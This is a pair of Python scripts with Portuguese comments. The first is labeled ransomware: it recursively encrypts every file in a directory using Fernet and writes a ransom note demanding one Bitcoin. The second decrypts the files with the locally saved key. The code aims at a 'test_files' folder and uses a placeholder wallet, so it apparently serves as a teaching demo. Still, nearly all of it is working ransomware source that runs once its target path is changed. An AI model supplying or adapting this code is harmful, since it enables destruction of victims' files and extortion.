--------------#1 CODIGO RANSOWARE--------------

from cryptography.fernet import Fernet
import os

# 1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar a chave
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados) 

# 4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            # Certifique-se de que o nome coincide exatamente com o nome do seu ficheiro .py
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista  # Corrigido: agora está fora do os.walk para varrer tudo

# 5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("MENSAGEM_DE_RESGATE.txt", "w") as f:
        f.write("Seus arquivos foram criptografados! Para recuperá-los, envie 1 Bitcoin para o endereço XYZ e entre em contato com o suporte.")

# 6. Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado com sucesso! Seus arquivos foram criptografados.")

if __name__ == "__main__": 
    main()


----------------#2.CODIGO DE DESCRIPTOGRAFIA----------------

from cryptography.fernet import Fernet
import os

# 1. Carregar a chave de criptografia salva
def carregar_chave():
    return open("chave.key", "rb").read()

# 2. Descriptografar um único arquivo
def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

# 3. Encontrar arquivos para descriptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            # Ignora o script, a chave e o aviso de resgate
            if nome != "ransomware.py" and not nome.endswith(".key") and nome != "MENSAGEM_DE_RESGATE.txt":
                lista.append(caminho)
    return lista  

# 4. Execução principal
def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    
    # Remove o arquivo de aviso de resgate automaticamente ao restaurar
    if os.path.exists("MENSAGEM_DE_RESGATE.txt"):
        os.remove("MENSAGEM_DE_RESGATE.txt")
        
    print("Descriptografia concluída com sucesso! Seus arquivos foram restaurados.")

if __name__ == "__main__":
    main()
